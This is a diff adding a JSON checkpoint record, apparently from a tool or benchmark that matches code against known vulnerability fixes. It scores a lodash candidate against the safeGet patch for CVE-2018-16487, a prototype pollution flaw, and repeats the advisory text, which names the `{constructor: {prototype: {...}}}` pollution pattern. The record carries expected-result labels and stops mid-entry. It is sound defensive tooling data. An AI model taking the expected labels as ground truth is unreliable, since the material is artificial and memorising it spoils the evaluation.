@@ -1,0 +1,1911 @@
+{
+  "checkpoint_key": "3e9cc9cc1ad765b2aaaf22d9b15cdd20a5f58a64d894f45c05b165e0787e6c1a",
+  "row": {
+    "candidate_id": "T2-0ad8e84352303d8c8832",
+    "tier": "tier2",
+    "package_name": "lodash",
+    "expected_status": "cleared",
+    "source_language": "javascript",
+    "requested_clone_type": "type_4",
+    "reviewed_clone_type": "unconfirmed",
+    "priority": "manual_review",
+    "hash_path": false,
+    "expected_hash_hit": false,
+    "expected_hash_types": [],
+    "expected_raw_retrieval_rank": 1,
+    "expected_retrieved": true,
+    "expected_shortlisted": true,
+    "expected_aggregate_rank": 1,
+    "expected_lineage_visible": true,
+    "expected_visible": true,
+    "correct_origin_automatic": false,
+    "wrong_origin_automatic": false,
+    "patched_false_positive": false,
+    "abstained": true,
+    "elapsed_seconds": 2.0104298000223935,
+    "result": {
+      "priority": "manual_review",
+      "candidate_id": "T2-0ad8e84352303d8c8832",
+      "hash_match_types": [],
+      "hash_matches": [],
+      "candidate_region_count": 17,
+      "retrieval_match_count": 17,
+      "aggregates": [
+        {
+          "pair_id": "boundary-6e880cf860d880b8bcde23c66b9d2e18106372730588e959acf8f2e6acb9619c:changed",
+          "lineage_id": "lineage-5a49dd3ede1a384fc6fae2e6e879bdaadd145793834795b545b74f55ebbf8e3a",
+          "fix_boundary_id": "boundary-6e880cf860d880b8bcde23c66b9d2e18106372730588e959acf8f2e6acb9619c",
+          "best_similarity": 0.995629608631134,
+          "candidate_region_ids": [
+            "candidate:T2-0ad8e84352303d8c8832:0000",
+            "candidate:T2-0ad8e84352303d8c8832:0001",
+            "candidate:T2-0ad8e84352303d8c8832:0003",
+            "candidate:T2-0ad8e84352303d8c8832:0009",
+            "candidate:T2-0ad8e84352303d8c8832:0010",
+            "candidate:T2-0ad8e84352303d8c8832:0012",
+            "candidate:T2-0ad8e84352303d8c8832:0015"
+          ],
+          "granularities": [
+            "block",
+            "changed",
+            "context"
+          ],
+          "top_matches": [
+            {
+              "pair_id": "boundary-6e880cf860d880b8bcde23c66b9d2e18106372730588e959acf8f2e6acb9619c:changed",
+              "lineage_id": "lineage-5a49dd3ede1a384fc6fae2e6e879bdaadd145793834795b545b74f55ebbf8e3a",
+              "fix_boundary_id": "boundary-6e880cf860d880b8bcde23c66b9d2e18106372730588e959acf8f2e6acb9619c",
+              "reference_side": "patched",
+              "advisories": [
+                {
+                  "ghsa_id": "GHSA-4xc9-xhrj-v574",
+                  "cve_id": "CVE-2018-16487",
+                  "cwes": [
+                    {
+                      "cwe_id": "CWE-400",
+                      "name": "Uncontrolled Resource Consumption"
+                    }
+                  ],
+                  "severity": "high",
+                  "advisory_title": "Prototype Pollution in lodash",
+                  "advisory_description": "Versions of `lodash` before 4.17.11 are vulnerable to prototype pollution. \n\nThe vulnerable functions are 'defaultsDeep', 'merge', and 'mergeWith' which allow a malicious user to modify the prototype of `Object` via `{constructor: {prototype: {...}}}` causing the addition or modification of an existing property that will exist on all objects.\n\n\n\n\n## Recommendation\n\nUpdate to version 4.17.11 or later.",
+                  "advisory_url": "https://github.com/advisories/GHSA-4xc9-xhrj-v574",
+                  "advisory_references": [
+                    "https://nvd.nist.gov/vuln/detail/CVE-2018-16487",
+                    "https://hackerone.com/reports/380873",
+                    "https://github.com/lodash/lodash/commit/90e6199a161b6445b01454517b40ef65ebecd2ad",
+                    "https://security.netapp.com/advisory/ntap-20190919-0004",
+                    "https://github.com/rubysec/ruby-advisory-db/blob/master/gems/lodash-rails/CVE-2018-16487.yml",
+                    "https://github.com/advisories/GHSA-4xc9-xhrj-v574"
+                  ],
+                  "osv_id": "GHSA-4xc9-xhrj-v574",
+                  "package_name": "lodash",
+                  "ecosystem": "npm",
+                  "affected_versions": [],
+                  "fixed_versions": [
+                    "4.17.11"
+                  ]
+                }
+              ],
+              "similarity": 0.995629608631134,
+              "rank": 1,
+              "candidate_region_id": "candidate:T2-0ad8e84352303d8c8832:0000",
+              "candidate_granularity": "changed",
+              "corpus_granularity": "changed",
+              "ghsa_id": "GHSA-4xc9-xhrj-v574",
+              "cve_id": "CVE-2018-16487",
+              "cwes": [
+                {
+                  "cwe_id": "CWE-400",
+                  "name": "Uncontrolled Resource Consumption"
+                }
+              ],
+              "severity": "high",
+              "advisory_title": "Prototype Pollution in lodash",
+              "advisory_description": "Versions of `lodash` before 4.17.11 are vulnerable to prototype pollution. \n\nThe vulnerable functions are 'defaultsDeep', 'merge', and 'mergeWith' which allow a malicious user to modify the prototype of `Object` via `{constructor: {prototype: {...}}}` causing the addition or modification of an existing property that will exist on all objects.\n\n\n\n\n## Recommendation\n\nUpdate to version 4.17.11 or later.",
+              "advisory_url": "https://github.com/advisories/GHSA-4xc9-xhrj-v574",
+              "advisory_references": [
+                "https://nvd.nist.gov/vuln/detail/CVE-2018-16487",
+                "https://hackerone.com/reports/380873",
+                "https://github.com/lodash/lodash/commit/90e6199a161b6445b01454517b40ef65ebecd2ad",
+                "https://security.netapp.com/advisory/ntap-20190919-0004",
+                "https://github.com/rubysec/ruby-advisory-db/blob/master/gems/lodash-rails/CVE-2018-16487.yml",
+                "https://github.com/advisories/GHSA-4xc9-xhrj-v574"
+              ],
+              "osv_id": "GHSA-4xc9-xhrj-v574",
+              "package_name": "lodash",
+              "ecosystem": "npm",
+              "affected_versions": [],
+              "fixed_versions": [
+                "4.17.11"
+              ],
+              "fix_commit_sha": "90e6199a161b6445b01454517b40ef65ebecd2ad",
+              "file_path": "lodash.js",
+              "function_name": "safeGet",
+              "source_language": "javascript"
+            },
+            {
+              "pair_id": "boundary-6e880cf860d880b8bcde23c66b9d2e18106372730588e959acf8f2e6acb9619c:changed",
+              "lineage_id": "lineage-5a49dd3ede1a384fc6fae2e6e879bdaadd145793834795b545b74f55ebbf8e3a",
+              "fix_boundary_id": "boundary-6e880cf860d880b8bcde23c66b9d2e18106372730588e959acf8f2e6acb9619c",
+              "reference_side": "patched",
+              "advisories": [
+                {
+                  "ghsa_id": "GHSA-4xc9-xhrj-v574",
+                  "cve_id": "CVE-2018-16487",
+                  "cwes": [
+                    {
+                      "cwe_id": "CWE-400",
+                      "name": "Uncontrolled Resource Consumption"
+                    }
+                  ],
+                  "severity": "high",
+                  "advisory_title": "Prototype Pollution in lodash",
+                  "advisory_description": "Versions of `lodash` before 4.17.11 are vulnerable to prototype pollution. \n\nThe vulnerable functions are 'defaultsDeep', 'merge', and 'mergeWith' which allow a malicious user to modify the prototype of `Object` via `{constructor: {prototype: {...}}}` causing the addition or modification of an existing property that will exist on all objects.\n\n\n\n\n## Recommendation\n\nUpdate to version 4.17.11 or later.",
+                  "advisory_url": "https://github.com/advisories/GHSA-4xc9-xhrj-v574",
+                  "advisory_references": [
+                    "https://nvd.nist.gov/vuln/detail/CVE-2018-16487",
+                    "https://hackerone.com/reports/380873",
+                    "https://github.com/lodash/lodash/commit/90e6199a161b6445b01454517b40ef65ebecd2ad",
+                    "https://security.netapp.com/advisory/ntap-20190919-0004",
+                    "https://github.com/rubysec/ruby-advisory-db/blob/master/gems/lodash-rails/CVE-2018-16487.yml",
+                    "https://github.com/advisories/GHSA-4xc9-xhrj-v574"
+                  ],
+                  "osv_id": "GHSA-4xc9-xhrj-v574",
+                  "package_name": "lodash",
+                  "ecosystem": "npm",
+                  "affected_versions": [],
+                  "fixed_versions": [
+                    "4.17.11"
+                  ]
+                }
+              ],
+              "similarity": 0.9956294298171997,
+              "rank": 1,
+              "candidate_region_id": "candidate:T2-0ad8e84352303d8c8832:0001",
+              "candidate_granularity": "block",
+              "corpus_granularity": "changed",
+              "ghsa_id": "GHSA-4xc9-xhrj-v574",
+              "cve_id": "CVE-2018-16487",
+              "cwes": [
+                {
+                  "cwe_id": "CWE-400",
+                  "name": "Uncontrolled Resource Consumption"
+                }
+              ],
+              "severity": "high",
+              "advisory_title": "Prototype Pollution in lodash",
+              "advisory_description": "Versions of `lodash` before 4.17.11 are vulnerable to prototype pollution. \n\nThe vulnerable functions are 'defaultsDeep', 'merge', and 'mergeWith' which allow a malicious user to modify the prototype of `Object` via `{constructor: {prototype: {...}}}` causing the addition or modification of an existing property that will exist on all objects.\n\n\n\n\n## Recommendation\n\nUpdate to version 4.17.11 or later.",
+              "advisory_url": "https://github.com/advisories/GHSA-4xc9-xhrj-v574",
+              "advisory_references": [
+                "https://nvd.nist.gov/vuln/detail/CVE-2018-16487",
+                "https://hackerone.com/reports/380873",
+                "https://github.com/lodash/lodash/commit/90e6199a161b6445b01454517b40ef65ebecd2ad",
+                "https://security.netapp.com/advisory/ntap-20190919-0004",
+                "https://github.com/rubysec/ruby-advisory-db/blob/master/gems/lodash-rails/CVE-2018-16487.yml",
+                "https://github.com/advisories/GHSA-4xc9-xhrj-v574"
+              ],
+              "osv_id": "GHSA-4xc9-xhrj-v574",
+              "package_name": "lodash",
+              "ecosystem": "npm",
+              "affected_versions": [],
+              "fixed_versions": [
+                "4.17.11"
+              ],
+              "fix_commit_sha": "90e6199a161b6445b01454517b40ef65ebecd2ad",
+              "file_path": "lodash.js",
+              "function_name": "safeGet",
+              "source_language": "javascript"
+            },
+            {
+              "pair_id": "boundary-6e880cf860d880b8bcde23c66b9d2e18106372730588e959acf8f2e6acb9619c:changed",
+              "lineage_id": "lineage-5a49dd3ede1a384fc6fae2e6e879bdaadd145793834795b545b74f55ebbf8e3a",
+              "fix_boundary_id": "boundary-6e880cf860d880b8bcde23c66b9d2e18106372730588e959acf8f2e6acb9619c",
+              "reference_side": "patched",
+              "advisories": [
+                {
+                  "ghsa_id": "GHSA-4xc9-xhrj-v574",
+                  "cve_id": "CVE-2018-16487",
+                  "cwes": [
+                    {
+                      "cwe_id": "CWE-400",
+                      "name": "Uncontrolled Resource Consumption"
+                    }
+                  ],
+                  "severity": "high",
+                  "advisory_title": "Prototype Pollution in lodash",
+                  "advisory_description": "Versions of `lodash` before 4.17.11 are vulnerable to prototype pollution. \n\nThe vulnerable functions are 'defaultsDeep', 'merge', and 'mergeWith' which allow a malicious user to modify the prototype of `Object` via `{constructor: {prototype: {...}}}` causing the addition or modification of an existing property that will exist on all objects.\n\n\n\n\n## Recommendation\n\nUpdate to version 4.17.11 or later.",
+                  "advisory_url": "https://github.com/advisories/GHSA-4xc9-xhrj-v574",
+                  "advisory_references": [
+                    "https://nvd.nist.gov/vuln/detail/CVE-2018-16487",
+                    "https://hackerone.com/reports/380873",
+                    "https://github.com/lodash/lodash/commit/90e6199a161b6445b01454517b40ef65ebecd2ad",
+                    "https://security.netapp.com/advisory/ntap-20190919-0004",
+                    "https://github.com/rubysec/ruby-advisory-db/blob/master/gems/lodash-rails/CVE-2018-16487.yml",
+                    "https://github.com/advisories/GHSA-4xc9-xhrj-v574"
+                  ],
+                  "osv_id": "GHSA-4xc9-xhrj-v574",
+                  "package_name": "lodash",
+                  "ecosystem": "npm",
+                  "affected_versions": [],
+                  "fixed_versions": [
+                    "4.17.11"
+                  ]
+                }
+              ],
+              "similarity": 0.9561836123466492,
+              "rank": 1,
+              "candidate_region_id": "candidate:T2-0ad8e84352303d8c8832:0009",
+              "candidate_granularity": "changed",
+              "corpus_granularity": "changed",
+              "ghsa_id": "GHSA-4xc9-xhrj-v574",
+              "cve_id": "CVE-2018-16487",
+              "cwes": [
+                {
+                  "cwe_id": "CWE-400",
+                  "name": "Uncontrolled Resource Consumption"
+                }
+              ],
+              "severity": "high",
+              "advisory_title": "Prototype Pollution in lodash",
+              "advisory_description": "Versions of `lodash` before 4.17.11 are vulnerable to prototype pollution. \n\nThe vulnerable functions are 'defaultsDeep', 'merge', and 'mergeWith' which allow a malicious user to modify the prototype of `Object` via `{constructor: {prototype: {...}}}` causing the addition or modification of an existing property that will exist on all objects.\n\n\n\n\n## Recommendation\n\nUpdate to version 4.17.11 or later.",
+              "advisory_url": "https://github.com/advisories/GHSA-4xc9-xhrj-v574",
+              "advisory_references": [
+                "https://nvd.nist.gov/vuln/detail/CVE-2018-16487",
+                "https://hackerone.com/reports/380873",
+                "https://github.com/lodash/lodash/commit/90e6199a161b6445b01454517b40ef65ebecd2ad",
+                "https://security.netapp.com/advisory/ntap-20190919-0004",
+                "https://github.com/rubysec/ruby-advisory-db/blob/master/gems/lodash-rails/CVE-2018-16487.yml",
+                "https://github.com/advisories/GHSA-4xc9-xhrj-v574"
+              ],
+              "osv_id": "GHSA-4xc9-xhrj-v574",
+              "package_name": "lodash",
+              "ecosystem": "npm",
+              "affected_versions": [],
+              "fixed_versions": [
+                "4.17.11"
+              ],
+              "fix_commit_sha": "90e6199a161b6445b01454517b40ef65ebecd2ad",
+              "file_path": "lodash.js",
+              "function_name": "safeGet",
+              "source_language": "javascript"
+            },
+            {
+              "pair_id": "boundary-6e880cf860d880b8bcde23c66b9d2e18106372730588e959acf8f2e6acb9619c:changed",
+              "lineage_id": "lineage-5a49dd3ede1a384fc6fae2e6e879bdaadd145793834795b545b74f55ebbf8e3a",
+              "fix_boundary_id": "boundary-6e880cf860d880b8bcde23c66b9d2e18106372730588e959acf8f2e6acb9619c",
+              "reference_side": "patched",
+              "advisories": [
+                {
+                  "ghsa_id": "GHSA-4xc9-xhrj-v574",
+                  "cve_id": "CVE-2018-16487",
+                  "cwes": [
+                    {
+                      "cwe_id": "CWE-400",
+                      "name": "Uncontrolled Resource Consumption"
+                    }
+                  ],
+                  "severity": "high",
+                  "advisory_title": "Prototype Pollution in lodash",
+                  "advisory_description": "Versions of `lodash` before 4.17.11 are vulnerable to prototype pollution. \n\nThe vulnerable functions are 'defaultsDeep', 'merge', and 'mergeWith' which allow a malicious user to modify the prototype of `Object` via `{constructor: {prototype: {...}}}` causing the addition or modification of an existing property that will exist on all objects.\n\n\n\n\n## Recommendation\n\nUpdate to version 4.17.11 or later.",
+                  "advisory_url": "https://github.com/advisories/GHSA-4xc9-xhrj-v574",
+                  "advisory_references": [
+                    "https://nvd.nist.gov/vuln/detail/CVE-2018-16487",
+                    "https://hackerone.com/reports/380873",
+                    "https://github.com/lodash/lodash/commit/90e6199a161b6445b01454517b40ef65ebecd2ad",
+                    "https://security.netapp.com/advisory/ntap-20190919-0004",
+                    "https://github.com/rubysec/ruby-advisory-db/blob/master/gems/lodash-rails/CVE-2018-16487.yml",
+                    "https://github.com/advisories/GHSA-4xc9-xhrj-v574"
+                  ],
+                  "osv_id": "GHSA-4xc9-xhrj-v574",
+                  "package_name": "lodash",
+                  "ecosystem": "npm",
+                  "affected_versions": [],
+                  "fixed_versions": [
+                    "4.17.11"
+                  ]
+                }
+              ],
+              "similarity": 0.9561835527420044,
+              "rank": 1,
+              "candidate_region_id": "candidate:T2-0ad8e84352303d8c8832:0010",
+              "candidate_granularity": "block",
+              "corpus_granularity": "changed",
+              "ghsa_id": "GHSA-4xc9-xhrj-v574",
+              "cve_id": "CVE-2018-16487",
+              "cwes": [
+                {
+                  "cwe_id": "CWE-400",
+                  "name": "Uncontrolled Resource Consumption"
+                }
+              ],
+              "severity": "high",
+              "advisory_title": "Prototype Pollution in lodash",
+              "advisory_description": "Versions of `lodash` before 4.17.11 are vulnerable to prototype pollution. \n\nThe vulnerable functions are 'defaultsDeep', 'merge', and 'mergeWith' which allow a malicious user to modify the prototype of `Object` via `{constructor: {prototype: {...}}}` causing the addition or modification of an existing property that will exist on all objects.\n\n\n\n\n## Recommendation\n\nUpdate to version 4.17.11 or later.",
+              "advisory_url": "https://github.com/advisories/GHSA-4xc9-xhrj-v574",
+              "advisory_references": [
+                "https://nvd.nist.gov/vuln/detail/CVE-2018-16487",
+                "https://hackerone.com/reports/380873",
+                "https://github.com/lodash/lodash/commit/90e6199a161b6445b01454517b40ef65ebecd2ad",
+                "https://security.netapp.com/advisory/ntap-20190919-0004",
+                "https://github.com/rubysec/ruby-advisory-db/blob/master/gems/lodash-rails/CVE-2018-16487.yml",
+                "https://github.com/advisories/GHSA-4xc9-xhrj-v574"
+              ],
+              "osv_id": "GHSA-4xc9-xhrj-v574",
+              "package_name": "lodash",
+              "ecosystem": "npm",
+              "affected_versions": [],
+              "fixed_versions": [
+                "4.17.11"
+              ],
+              "fix_commit_sha": "90e6199a161b6445b01454517b40ef65ebecd2ad",
+              "file_path": "lodash.js",
+              "function_name": "safeGet",
+              "source_language": "javascript"
+            },
+            {
+              "pair_id": "boundary-6e880cf860d880b8bcde23c66b9d2e18106372730588e959acf8f2e6acb9619c:changed",
+              "lineage_id": "lineage-5a49dd3ede1a384fc6fae2e6e879bdaadd145793834795b545b74f55ebbf8e3a",
+              "fix_boundary_id": "boundary-6e880cf860d880b8bcde23c66b9d2e18106372730588e959acf8f2e6acb9619c",
+              "reference_side": "vulnerable",
+              "advisories": [
+                {
+                  "ghsa_id": "GHSA-4xc9-xhrj-v574",
+                  "cve_id": "CVE-2018-16487",
+                  "cwes": [
+                    {
+                      "cwe_id": "CWE-400",
+                      "name": "Uncontrolled Resource Consumption"
+                    }
+                  ],
+                  "severity": "high",
+                  "advisory_title": "Prototype Pollution in lodash",
+                  "advisory_description": "Versions of `lodash` before 4.17.11 are vulnerable to prototype pollution. \n\nThe vulnerable functions are 'defaultsDeep', 'merge', and 'mergeWith' which allow a malicious user to modify the prototype of `Object` via `{constructor: {prototype: {...}}}` causing the addition or modification of an existing property that will exist on all objects.\n\n\n\n\n## Recommendation\n\nUpdate to version 4.17.11 or later.",
+                  "advisory_url": "https://github.com/advisories/GHSA-4xc9-xhrj-v574",
+                  "advisory_references": [
+                    "https://nvd.nist.gov/vuln/detail/CVE-2018-16487",
+                    "https://hackerone.com/reports/380873",
+                    "https://github.com/lodash/lodash/commit/90e6199a161b6445b01454517b40ef65ebecd2ad",
+                    "https://security.netapp.com/advisory/ntap-20190919-0004",
+                    "https://github.com/rubysec/ruby-advisory-db/blob/master/gems/lodash-rails/CVE-2018-16487.yml",
+                    "https://github.com/advisories/GHSA-4xc9-xhrj-v574"
+                  ],
+                  "osv_id": "GHSA-4xc9-xhrj-v574",
+                  "package_name": "lodash",
+                  "ecosystem": "npm",
+                  "affected_versions": [],
+                  "fixed_versions": [
+                    "4.17.11"
+                  ]
+                }
+              ],
+              "similarity": 0.8983228802680969,
+              "rank": 1,
+              "candidate_region_id": "candidate:T2-0ad8e84352303d8c8832:0015",
+              "candidate_granularity": "context",
+              "corpus_granularity": "changed",
+              "ghsa_id": "GHSA-4xc9-xhrj-v574",
+              "cve_id": "CVE-2018-16487",
+              "cwes": [
+                {
+                  "cwe_id": "CWE-400",
+                  "name": "Uncontrolled Resource Consumption"
+                }
+              ],
+              "severity": "high",
+              "advisory_title": "Prototype Pollution in lodash",
+              "advisory_description": "Versions of `lodash` before 4.17.11 are vulnerable to prototype pollution. \n\nThe vulnerable functions are 'defaultsDeep', 'merge', and 'mergeWith' which allow a malicious user to modify the prototype of `Object` via `{constructor: {prototype: {...}}}` causing the addition or modification of an existing property that will exist on all objects.\n\n\n\n\n## Recommendation\n\nUpdate to version 4.17.11 or later.",
+              "advisory_url": "https://github.com/advisories/GHSA-4xc9-xhrj-v574",
+              "advisory_references": [
+                "https://nvd.nist.gov/vuln/detail/CVE-2018-16487",
+                "https://hackerone.com/reports/380873",
+                "https://github.com/lodash/lodash/commit/90e6199a161b6445b01454517b40ef65ebecd2ad",
+                "https://security.netapp.com/advisory/ntap-20190919-0004",
+                "https://github.com/rubysec/ruby-advisory-db/blob/master/gems/lodash-rails/CVE-2018-16487.yml",
+                "https://github.com/advisories/GHSA-4xc9-xhrj-v574"
+              ],
+              "osv_id": "GHSA-4xc9-xhrj-v574",
+              "package_name": "lodash",
+              "ecosystem": "npm",
+              "affected_versions": [],
+              "fixed_versions": [
+                "4.17.11"
+              ],
+              "fix_commit_sha": "90e6199a161b6445b01454517b40ef65ebecd2ad",
+              "file_path": "lodash.js",
+              "function_name": "safeGet",
+              "source_language": "javascript"
+            }
+          ],
+          "support_count": 7
+        },
+        {
+          "pair_id": "boundary-6e880cf860d880b8bcde23c66b9d2e18106372730588e959acf8f2e6acb9619c:context",
+          "lineage_id": "lineage-5a49dd3ede1a384fc6fae2e6e879bdaadd145793834795b545b74f55ebbf8e3a",
+          "fix_boundary_id": "boundary-6e880cf860d880b8bcde23c66b9d2e18106372730588e959acf8f2e6acb9619c",
+          "best_similarity": 0.9955171942710876,
+          "candidate_region_ids": [
+            "candidate:T2-0ad8e84352303d8c8832:0002",
+            "candidate:T2-0ad8e84352303d8c8832:0004",
+            "candidate:T2-0ad8e84352303d8c8832:0005",
+            "candidate:T2-0ad8e84352303d8c8832:0008",
+            "candidate:T2-0ad8e84352303d8c8832:0011",
+            "candidate:T2-0ad8e84352303d8c8832:0013"
+          ],
+          "granularities": [
+            "context"
+          ],
+          "top_matches": [
+            {
+              "pair_id": "boundary-6e880cf860d880b8bcde23c66b9d2e18106372730588e959acf8f2e6acb9619c:context",
+              "lineage_id": "lineage-5a49dd3ede1a384fc6fae2e6e879bdaadd145793834795b545b74f55ebbf8e3a",
+              "fix_boundary_id": "boundary-6e880cf860d880b8bcde23c66b9d2e18106372730588e959acf8f2e6acb9619c",
+              "reference_side": "patched",
+              "advisories": [
+                {
+                  "ghsa_id": "GHSA-4xc9-xhrj-v574",
+                  "cve_id": "CVE-2018-16487",
+                  "cwes": [
+                    {
+                      "cwe_id": "CWE-400",
+                      "name": "Uncontrolled Resource Consumption"
+                    }
+                  ],
+                  "severity": "high",
+                  "advisory_title": "Prototype Pollution in lodash",
+                  "advisory_description": "Versions of `lodash` before 4.17.11 are vulnerable to prototype pollution. \n\nThe vulnerable functions are 'defaultsDeep', 'merge', and 'mergeWith' which allow a malicious user to modify the prototype of `Object` via `{constructor: {prototype: {...}}}` causing the addition or modification of an existing property that will exist on all objects.\n\n\n\n\n## Recommendation\n\nUpdate to version 4.17.11 or later.",
+                  "advisory_url": "https://github.com/advisories/GHSA-4xc9-xhrj-v574",
+                  "advisory_references": [
+                    "https://nvd.nist.gov/vuln/detail/CVE-2018-16487",
+                    "https://hackerone.com/reports/380873",
+                    "https://github.com/lodash/lodash/commit/90e6199a161b6445b01454517b40ef65ebecd2ad",
+                    "https://security.netapp.com/advisory/ntap-20190919-0004",
+                    "https://github.com/rubysec/ruby-advisory-db/blob/master/gems/lodash-rails/CVE-2018-16487.yml",
+                    "https://github.com/advisories/GHSA-4xc9-xhrj-v574"
+                  ],
+                  "osv_id": "GHSA-4xc9-xhrj-v574",
+                  "package_name": "lodash",
+                  "ecosystem": "npm",
+                  "affected_versions": [],
+                  "fixed_versions": [
+                    "4.17.11"
+                  ]
+                }
+              ],
+              "similarity": 0.9955171942710876,
+              "rank": 1,
+              "candidate_region_id": "candidate:T2-0ad8e84352303d8c8832:0002",
+              "candidate_granularity": "context",
+              "corpus_granularity": "context",
+              "ghsa_id": "GHSA-4xc9-xhrj-v574",
+              "cve_id": "CVE-2018-16487",
+              "cwes": [
+                {
+                  "cwe_id": "CWE-400",
+                  "name": "Uncontrolled Resource Consumption"
+                }
+              ],
+              "severity": "high",
+              "advisory_title": "Prototype Pollution in lodash",
+              "advisory_description": "Versions of `lodash` before 4.17.11 are vulnerable to prototype pollution. \n\nThe vulnerable functions are 'defaultsDeep', 'merge', and 'mergeWith' which allow a malicious user to modify the prototype of `Object` via `{constructor: {prototype: {...}}}` causing the addition or modification of an existing property that will exist on all objects.\n\n\n\n\n## Recommendation\n\nUpdate to version 4.17.11 or later.",
+              "advisory_url": "https://github.com/advisories/GHSA-4xc9-xhrj-v574",
+              "advisory_references": [
+                "https://nvd.nist.gov/vuln/detail/CVE-2018-16487",
+                "https://hackerone.com/reports/380873",
+                "https://github.com/lodash/lodash/commit/90e6199a161b6445b01454517b40ef65ebecd2ad",
+                "https://security.netapp.com/advisory/ntap-20190919-0004",
+                "https://github.com/rubysec/ruby-advisory-db/blob/master/gems/lodash-rails/CVE-2018-16487.yml",
+                "https://github.com/advisories/GHSA-4xc9-xhrj-v574"
+              ],
+              "osv_id": "GHSA-4xc9-xhrj-v574",
+              "package_name": "lodash",
+              "ecosystem": "npm",
+              "affected_versions": [],
+              "fixed_versions": [
+                "4.17.11"
+              ],
+              "fix_commit_sha": "90e6199a161b6445b01454517b40ef65ebecd2ad",
+              "file_path": "lodash.js",
+              "function_name": "safeGet",
+              "source_language": "javascript"
+            },
+            {
+              "pair_id": "boundary-6e880cf860d880b8bcde23c66b9d2e18106372730588e959acf8f2e6acb9619c:context",
+              "lineage_id": "lineage-5a49dd3ede1a384fc6fae2e6e879bdaadd145793834795b545b74f55ebbf8e3a",
+              "fix_boundary_id": "boundary-6e880cf860d880b8bcde23c66b9d2e18106372730588e959acf8f2e6acb9619c",
+              "reference_side": "vulnerable",
+              "advisories": [
+                {
+                  "ghsa_id": "GHSA-4xc9-xhrj-v574",
+                  "cve_id": "CVE-2018-16487",
+                  "cwes": [
+                    {
+                      "cwe_id": "CWE-400",
+                      "name": "Uncontrolled Resource Consumption"
+                    }
+                  ],
+                  "severity": "high",
+                  "advisory_title": "Prototype Pollution in lodash",
+                  "advisory_description": "Versions of `lodash` before 4.17.11 are vulnerable to prototype pollution. \n\nThe vulnerable functions are 'defaultsDeep', 'merge', and 'mergeWith' which allow a malicious user to modify the prototype of `Object` via `{constructor: {prototype: {...}}}` causing the addition or modification of an existing property that will exist on all objects.\n\n\n\n\n## Recommendation\n\nUpdate to version 4.17.11 or later.",
+                  "advisory_url": "https://github.com/advisories/GHSA-4xc9-xhrj-v574",
+                  "advisory_references": [
+                    "https://nvd.nist.gov/vuln/detail/CVE-2018-16487",
+                    "https://hackerone.com/reports/380873",
+                    "https://github.com/lodash/lodash/commit/90e6199a161b6445b01454517b40ef65ebecd2ad",
+                    "https://security.netapp.com/advisory/ntap-20190919-0004",
+                    "https://github.com/rubysec/ruby-advisory-db/blob/master/gems/lodash-rails/CVE-2018-16487.yml",
+                    "https://github.com/advisories/GHSA-4xc9-xhrj-v574"
+                  ],
+                  "osv_id": "GHSA-4xc9-xhrj-v574",
+                  "package_name": "lodash",
+                  "ecosystem": "npm",
+                  "affected_versions": [],
+                  "fixed_versions": [
+                    "4.17.11"
+                  ]
+                }
+              ],
+              "similarity": 0.9723865985870361,
+              "rank": 1,
+              "candidate_region_id": "candidate:T2-0ad8e84352303d8c8832:0005",
+              "candidate_granularity": "context",
+              "corpus_granularity": "context",
+              "ghsa_id": "GHSA-4xc9-xhrj-v574",
+              "cve_id": "CVE-2018-16487",
+              "cwes": [
+                {
+                  "cwe_id": "CWE-400",
+                  "name": "Uncontrolled Resource Consumption"
+                }
+              ],
+              "severity": "high",
+              "advisory_title": "Prototype Pollution in lodash",
+              "advisory_description": "Versions of `lodash` before 4.17.11 are vulnerable to prototype pollution. \n\nThe vulnerable functions are 'defaultsDeep', 'merge', and 'mergeWith' which allow a malicious user to modify the prototype of `Object` via `{constructor: {prototype: {...}}}` causing the addition or modification of an existing property that will exist on all objects.\n\n\n\n\n## Recommendation\n\nUpdate to version 4.17.11 or later.",
+              "advisory_url": "https://github.com/advisories/GHSA-4xc9-xhrj-v574",
+              "advisory_references": [
+                "https://nvd.nist.gov/vuln/detail/CVE-2018-16487",
+                "https://hackerone.com/reports/380873",
+                "https://github.com/lodash/lodash/commit/90e6199a161b6445b01454517b40ef65ebecd2ad",
+                "https://security.netapp.com/advisory/ntap-20190919-0004",
+                "https://github.com/rubysec/ruby-advisory-db/blob/master/gems/lodash-rails/CVE-2018-16487.yml",
+                "https://github.com/advisories/GHSA-4xc9-xhrj-v574"
+              ],
+              "osv_id": "GHSA-4xc9-xhrj-v574",
+              "package_name": "lodash",
+              "ecosystem": "npm",
+              "affected_versions": [],
+              "fixed_versions": [
+                "4.17.11"
+              ],
+              "fix_commit_sha": "90e6199a161b6445b01454517b40ef65ebecd2ad",
+              "file_path": "lodash.js",
+              "function_name": "safeGet",
+              "source_language": "javascript"
+            },
+            {
+              "pair_id": "boundary-6e880cf860d880b8bcde23c66b9d2e18106372730588e959acf8f2e6acb9619c:context",
+              "lineage_id": "lineage-5a49dd3ede1a384fc6fae2e6e879bdaadd145793834795b545b74f55ebbf8e3a",
+              "fix_boundary_id": "boundary-6e880cf860d880b8bcde23c66b9d2e18106372730588e959acf8f2e6acb9619c",
+              "reference_side": "patched",
+              "advisories": [
+                {
+                  "ghsa_id": "GHSA-4xc9-xhrj-v574",
+                  "cve_id": "CVE-2018-16487",
+                  "cwes": [
+                    {
+                      "cwe_id": "CWE-400",
+                      "name": "Uncontrolled Resource Consumption"
+                    }
+                  ],
+                  "severity": "high",
+                  "advisory_title": "Prototype Pollution in lodash",
+                  "advisory_description": "Versions of `lodash` before 4.17.11 are vulnerable to prototype pollution. \n\nThe vulnerable functions are 'defaultsDeep', 'merge', and 'mergeWith' which allow a malicious user to modify the prototype of `Object` via `{constructor: {prototype: {...}}}` causing the addition or modification of an existing property that will exist on all objects.\n\n\n\n\n## Recommendation\n\nUpdate to version 4.17.11 or later.",
+                  "advisory_url": "https://github.com/advisories/GHSA-4xc9-xhrj-v574",
+                  "advisory_references": [
+                    "https://nvd.nist.gov/vuln/detail/CVE-2018-16487",
+                    "https://hackerone.com/reports/380873",
+                    "https://github.com/lodash/lodash/commit/90e6199a161b6445b01454517b40ef65ebecd2ad",
+                    "https://security.netapp.com/advisory/ntap-20190919-0004",
+                    "https://github.com/rubysec/ruby-advisory-db/blob/master/gems/lodash-rails/CVE-2018-16487.yml",
+                    "https://github.com/advisories/GHSA-4xc9-xhrj-v574"
+                  ],
+                  "osv_id": "GHSA-4xc9-xhrj-v574",
+                  "package_name": "lodash",
+                  "ecosystem": "npm",
+                  "affected_versions": [],
+                  "fixed_versions": [
+                    "4.17.11"
+                  ]
+                }
+              ],
+              "similarity": 0.9687785506248474,
+              "rank": 1,
